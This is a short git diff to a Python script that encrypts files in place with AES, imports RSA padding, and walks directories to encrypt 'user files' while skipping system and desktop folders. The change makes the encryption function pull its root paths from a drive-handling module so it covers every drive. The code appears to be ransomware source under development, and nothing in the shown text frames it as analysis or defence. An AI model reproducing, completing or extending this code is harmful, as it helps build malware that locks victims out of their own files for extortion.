@@ -6,6 +6,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding as sym_padding
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+from Driver_Handling import root_paths
 from Variables import script_files, system_dirs, system_desktop_dirs
 
 ####################################################################################################################
@@ -68,8 +69,8 @@ def encrypt_file_with_aes(file_path, key):
     with open(file_path, "wb") as f:
         f.write(iv + encrypted_data)
 
-def encrypt_user_files(root_path, aes_key):
-    script_dir = os.path.dirname(os.path.abspath(__file__))
+def encrypt_user_files(aes_key):
+    root_path = root_paths()
 
     for root, dirs, files in os.walk(root_path):
         if any(exclude in root for exclude in system_desktop_dirs):
